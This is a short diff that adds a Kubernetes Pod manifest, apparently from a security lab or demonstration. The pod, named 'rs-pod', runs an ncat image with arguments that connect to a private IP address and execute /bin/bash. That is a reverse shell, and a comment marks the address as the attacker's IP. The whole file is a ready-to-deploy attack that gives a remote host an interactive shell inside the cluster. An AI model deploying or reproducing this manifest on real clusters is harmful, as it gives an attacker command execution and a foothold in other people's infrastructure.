@@ -1,0 +1,12 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rs-pod
+  namespace: dev
+  labels:
+    app: ncat
+spec:
+  containers:
+    - name: rs-pod
+      image: raesene/ncat
+      args: ["192.168.0.110", "3456", "-e", "/bin/bash"] # IP address is attacker IP
